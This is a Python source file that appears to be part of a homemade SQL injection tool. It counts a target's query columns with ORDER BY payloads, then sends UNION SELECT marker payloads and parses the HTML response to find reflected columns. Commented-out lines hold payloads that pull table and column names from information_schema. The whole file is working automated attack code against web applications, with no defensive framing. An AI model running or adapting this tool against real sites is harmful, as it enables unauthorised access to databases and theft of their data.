# from utils.ainsi import *
# from utils.objects.vuln_link import vuln_link 

# import sys, requests



import requests
from utils.ainsi import *
from utils.objects.vuln_link import *
from urllib.parse import urlparse
import re
from bs4 import BeautifulSoup

def generate_union_select_payload(number):
        payloads = [
                    "' UNION SELECT 'MARKER_A'-- -",
                    "' UNION SELECT 'MARKER_A', 'MARKER_B'-- -",
                    "' UNION SELECT 'MARKER_A', 'MARKER_B', 'MARKER_C'-- -",
                    "' UNION SELECT 'MARKER_A', 'MARKER_B', 'MARKER_C', 'MARKER_D'-- -",
                    "' UNION SELECT 'MARKER_A', 'MARKER_B', 'MARKER_C', 'MARKER_D', 'MARKER_E'-- -",
                    "' UNION SELECT 'MARKER_A', 'MARKER_B', 'MARKER_C', 'MARKER_D', 'MARKER_E', 'MARKER_F'-- -",
                    "' UNION SELECT 'MARKER_A', 'MARKER_B', 'MARKER_C', 'MARKER_D', 'MARKER_E', 'MARKER_F', 'MARKER_G'-- -",
                    "' UNION SELECT 'MARKER_A', 'MARKER_B', 'MARKER_C', 'MARKER_D', 'MARKER_E', 'MARKER_F', 'MARKER_G', 'MARKER_H'-- -",
                    "' UNION SELECT 'MARKER_A', 'MARKER_B', 'MARKER_C', 'MARKER_D', 'MARKER_E', 'MARKER_F', 'MARKER_G', 'MARKER_H', 'MARKER_I'-- -",
                    "' UNION SELECT 'MARKER_A', 'MARKER_B', 'MARKER_C', 'MARKER_D', 'MARKER_E', 'MARKER_F', 'MARKER_G', 'MARKER_H', 'MARKER_I', 'MARKER_J'-- -"
                ]
        return payloads[number - 1]

def generate_marker_to_find(number):
        base = "ABCDEFGHIJ"
        chars = set()
        if (number > len(base)):
            return chars
        for i in range(0, number):
            chars.add("MARKER_" + base[i])
        chars = sorted(chars)
        return chars   

def perform_request(link):
    try:
        response = requests.get(link)
        response.raise_for_status()  # Raise an HTTPError for bad responses (4xx and 5xx)
        return response
    except requests.exceptions.RequestException as e:
        print(f"{colored('Failed to request ', RED)} {colored(link, BRIGHT_RED, styles=BOLD)}: {e}")
        return None

def get_injection(vuln_links):
    
    for vuln_link in vuln_links:
        try :
            identified_db, link, query_params, success = vuln_link.get_infos()
            parsed_url = urlparse(link)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
            print(f"[{colored(link, RED)}]]")
            
            # response = perform_request(link)
            # response.encoding = "utf-8"
            
            # first_page = response.text
            get_union_based_injection(query_params, base_url)
            

        except Exception as e:
            print(f"{colored('ERROR INJECTION : ', RED, styles=UNDERLINE)}")


def get_union_based_injection(query_params, base_url):
        columns = 0
        #! SEARCH FOR NUM OF COLUMNS
        for i in range(0, 10):
            payload = f"' ORDER BY {i}-- -"
            
            params = query_params.copy() if isinstance(query_params, dict) else {}
            
            param_name = list(params.keys())[0] if params else query_params
            params[param_name] = payload
            
            response = requests.get(base_url, params=params)
            if "Unknown column" in response.text and i != 0:
                columns = i - 1
                break
        
        print(f"columns find {colored(str(columns), GREEN, styles=BOLD)}")
        if columns < 2:
            return None
        
        #! INJECTING PARAMETERS TO FIND CATEGORY
        payload = generate_union_select_payload(columns)
        
        params = query_params.copy() if isinstance(query_params, dict) else {}
        
        param_name = list(params.keys())[0] if params else query_params
        params[param_name] = payload
        
        response = requests.get(base_url, params=params)
        print(f"{colored(response.url, RED)}")
        
        marker_to_find = generate_marker_to_find(columns)
        # for marker in marker_to_find:
        #     if marker in response.text:
        #         print(marker)
        
        soup = BeautifulSoup(response.text, "html.parser")
        class_elements = soup.find_all(string=True)
        
        for element in class_elements:            
            if element in marker_to_find:
                print(f"[{colored(element, GREEN)}]")
            elif element == '\n':
                pass
            else:
                print(f"[{colored(element, RED)}]")
        
        # print(f"{colored(response.text, GREEN)}")
        
        
        # print(f"Extracted values: {marker_to_find}")
        # print(response.url)
        
        # payload = "2' UNION SELECT 1, GROUP_CONCAT(table_name), 3 FROM information_schema.tables WHERE table_schema=DATABASE()-- -"
        # payload = "2' union select 1,group_concat(column_name),3 FROM information_schema.columns where table_name="Users" --+-"
        params = query_params.copy() if isinstance(query_params, dict) else {}
        
        param_name = list(params.keys())[0] if params else query_params
        params[param_name] = payload
        response = requests.get(base_url, params=params)
        
        print(response.text)
        # # print(f"{colored(response.url, RED, styles=BOLD)}")

